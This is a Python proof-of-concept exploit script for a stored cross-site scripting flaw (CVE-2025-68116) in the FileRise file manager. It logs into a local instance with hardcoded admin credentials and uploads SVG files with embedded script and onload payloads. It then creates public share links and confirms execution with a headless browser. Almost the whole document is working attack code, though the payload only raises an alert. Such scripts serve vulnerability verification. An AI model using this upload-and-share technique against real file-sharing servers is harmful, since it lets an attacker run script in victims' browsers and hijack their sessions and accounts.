#!/usr/bin/env python3
import sys
import time
import requests
import os

TARGET_URL = "http://localhost:8081"
USERNAME = "admin"
PASSWORD = "Admin@123456"

MALICIOUS_SVG = '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
  <script type="text/javascript">
    alert('XSS-CVE-2025-68116');
  </script>
  <text x="10" y="50">XSS Test</text>
</svg>'''

MALICIOUS_SVG_ONLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS-CVE-2025-68116')">
  <text x="10" y="50">XSS Test</text>
</svg>'''


class FileRiseExploit:
    def __init__(self):
        self.session = requests.Session()
        self.token = None
        self.share_id = None
        self.csrf_token = None

    def check_service(self):
        try:
            resp = self.session.get(TARGET_URL, timeout=10)
            return resp.status_code == 200
        except:
            return False

    def get_csrf_token(self):
        try:
            resp = self.session.get(f"{TARGET_URL}/api/auth/checkAuth.php", timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("csrfToken"):
                    self.csrf_token = result.get("csrfToken")
                    return self.csrf_token
            resp = self.session.get(f"{TARGET_URL}/api/siteConfig.php", timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("csrfToken"):
                    self.csrf_token = result.get("csrfToken")
                    return self.csrf_token
        except:
            pass
        return None

    def login(self):
        print(f"[*] Logging in as {USERNAME}...")
        login_url = f"{TARGET_URL}/api/auth/auth.php"
        data = {
            "username": USERNAME,
            "password": PASSWORD
        }
        try:
            resp = self.session.post(login_url, json=data, timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("status") == "ok" or result.get("success"):
                    self.token = result.get("token")
                    if result.get("csrfToken"):
                        self.csrf_token = result.get("csrfToken")
                    print(f"[+] Login successful")
                    self.get_csrf_token()
                    return True
                else:
                    print(f"[-] Login failed: {result}")
                    return False
            else:
                print(f"[-] Login failed with status {resp.status_code}: {resp.text[:200]}")
                return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False

    def upload_svg(self, svg_content, filename="xss_poc.svg"):
        print(f"[*] Uploading malicious SVG: {filename}")
        upload_url = f"{TARGET_URL}/api/upload/upload.php"
        
        files = {
            'file[]': (filename, svg_content.encode(), 'image/svg+xml')
        }
        data = {
            'folder': 'root'
        }
        
        headers = {}
        if self.csrf_token:
            headers['X-CSRF-Token'] = self.csrf_token
            data['csrf_token'] = self.csrf_token
            
        try:
            resp = self.session.post(upload_url, files=files, data=data, headers=headers, timeout=30)
            if resp.status_code == 200:
                try:
                    result = resp.json()
                    if result.get("csrf_expired"):
                        self.csrf_token = result.get("csrf_token")
                        return self.upload_svg(svg_content, filename)
                    if result.get("success"):
                        print(f"[+] SVG uploaded successfully")
                        return filename
                    else:
                        print(f"[-] Upload failed: {result}")
                        return None
                except:
                    if "success" in resp.text.lower():
                        print(f"[+] SVG uploaded (non-JSON response)")
                        return filename
                    return None
            else:
                print(f"[-] Upload failed with status {resp.status_code}: {resp.text[:200]}")
                return None
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return None

    def create_share(self, filename):
        print(f"[*] Creating share link for {filename}...")
        share_url = f"{TARGET_URL}/api/file/createShareLink.php"
        
        data = {
            'file': filename,
            'folder': 'root'
        }
        
        headers = {}
        if self.csrf_token:
            headers['X-CSRF-Token'] = self.csrf_token
            data['csrf_token'] = self.csrf_token
            
        try:
            resp = self.session.post(share_url, json=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                try:
                    result = resp.json()
                    if result.get("csrf_expired"):
                        self.csrf_token = result.get("csrf_token")
                        return self.create_share(filename)
                    if result.get("token"):
                        token = result.get("token")
                        share_link = f"{TARGET_URL}/api/file/share.php?token={token}"
                        print(f"[+] Share link created: {share_link}")
                        return share_link
                    else:
                        print(f"[-] Share creation failed: {result}")
                        return None
                except:
                    pass
            print(f"[-] Share creation failed with status {resp.status_code}")
            return None
        except Exception as e:
            print(f"[-] Share error: {e}")
            return None

    def get_download_url(self, filename):
        return f"{TARGET_URL}/api/file/download.php?file={filename}&folder=root"

    def verify_content_type(self, url):
        print(f"[*] Checking content-type for: {url}")
        try:
            resp = self.session.get(url, timeout=10, allow_redirects=True)
            content_type = resp.headers.get('Content-Type', '')
            print(f"[*] Content-Type: {content_type}")
            print(f"[*] Response status: {resp.status_code}")
            
            if 'svg' in content_type.lower() or 'xml' in content_type.lower():
                print(f"[+] VULNERABLE: SVG served with renderable content-type!")
                return True
            elif 'html' in content_type.lower():
                print(f"[+] VULNERABLE: Content served as HTML!")
                return True
            elif 'octet-stream' in content_type.lower():
                print(f"[-] Safe: Content served as binary download")
                return False
            else:
                if '<script' in resp.text or 'onload=' in resp.text:
                    print(f"[+] SVG content preserved - XSS payload present in response")
                    return True
                return False
        except Exception as e:
            print(f"[-] Verification error: {e}")
            return False


def run_browser_test(share_url, download_url):
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.common.exceptions import UnexpectedAlertPresentException
        
        print("\n[*] Running browser-based verification...")
        
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-web-security")
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(15)
        
        for url in [share_url, download_url]:
            if not url:
                continue
            print(f"[*] Testing URL: {url}")
            try:
                driver.get(url)
                time.sleep(2)
                
                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    print(f"[+] XSS TRIGGERED! Alert: {alert_text}")
                    driver.quit()
                    return True
                except:
                    pass
                    
            except UnexpectedAlertPresentException:
                print(f"[+] XSS TRIGGERED via UnexpectedAlertPresentException!")
                try:
                    driver.switch_to.alert.accept()
                except:
                    pass
                driver.quit()
                return True
            except Exception as e:
                if "alert" in str(e).lower():
                    print(f"[+] XSS likely triggered (alert blocked navigation)")
                    driver.quit()
                    return True
                    
        driver.quit()
        return False
        
    except ImportError:
        print("[-] Selenium not installed, skipping browser test")
        return None
    except Exception as e:
        print(f"[-] Browser test error: {e}")
        return None


def main():
    print("=" * 60)
    print("CVE-2025-68116 - FileRise Stored XSS via SVG Upload")
    print("=" * 60)
    print()
    
    exploit = FileRiseExploit()
    
    print("[*] Checking if FileRise is running...")
    if not exploit.check_service():
        print(f"[-] FileRise not accessible at {TARGET_URL}")
        print("[*] Start with: docker-compose up -d")
        sys.exit(1)
    print("[+] FileRise is running")
    print()
    
    if not exploit.login():
        print("[-] Failed to login. Make sure the account exists.")
        print("[*] Create admin account first via web UI")
        sys.exit(1)
    print()
    
    filename = exploit.upload_svg(MALICIOUS_SVG, "xss_poc.svg")
    if not filename:
        filename = exploit.upload_svg(MALICIOUS_SVG_ONLOAD, "xss_poc2.svg")
    
    if not filename:
        print("[-] Failed to upload SVG file")
        sys.exit(1)
    print()
    
    share_url = exploit.create_share(filename)
    download_url = exploit.get_download_url(filename)
    print(f"[*] Download URL: {download_url}")
    print()
    
    print("[*] Verifying vulnerability...")
    vuln_share = False
    vuln_download = False
    
    if share_url:
        vuln_share = exploit.verify_content_type(share_url)
    vuln_download = exploit.verify_content_type(download_url)
    
    browser_result = run_browser_test(share_url, download_url)
    
    print()
    print("=" * 60)
    print("[*] SUMMARY")
    print("=" * 60)
    
    result_log = []
    result_log.append("CVE-2025-68116 - FileRise Stored XSS via SVG Upload")
    result_log.append("=" * 60)
    result_log.append(f"Target: {TARGET_URL}")
    result_log.append(f"Username: {USERNAME}")
    result_log.append(f"Uploaded file: {filename}")
    result_log.append(f"Share URL: {share_url}")
    result_log.append(f"Download URL: {download_url}")
    result_log.append("")
    
    if vuln_share or vuln_download or browser_result:
        print("[+] VULNERABILITY CONFIRMED!")
        print(f"[!] FileRise v2.5.2 is VULNERABLE to CVE-2025-68116")
        print()
        print("Attack scenario:")
        print("1. Attacker uploads malicious SVG file")
        print("2. Attacker creates/obtains share link")
        print("3. Victim opens the share link in browser")
        print("4. JavaScript in SVG executes in victim's context")
        print()
        print("Impact: Session hijacking, data theft, account takeover")
        
        result_log.append("RESULT: VULNERABLE")
        result_log.append("")
        result_log.append("Malicious SVG content:")
        result_log.append(MALICIOUS_SVG)
        
        with open("result.log", "w") as f:
            f.write("\n".join(result_log))
        
        print(f"\n[*] Results written to result.log")
        return 0
    else:
        print("[-] Could not confirm vulnerability via automated test")
        print("[*] Manual verification may be required")
        print(f"[*] Try opening these URLs in a browser:")
        if share_url:
            print(f"    - {share_url}")
        print(f"    - {download_url}")
        
        result_log.append("RESULT: NEEDS MANUAL VERIFICATION")
        
        with open("result.log", "w") as f:
            f.write("\n".join(result_log))
        
        return 1


if __name__ == "__main__":
    sys.exit(main())
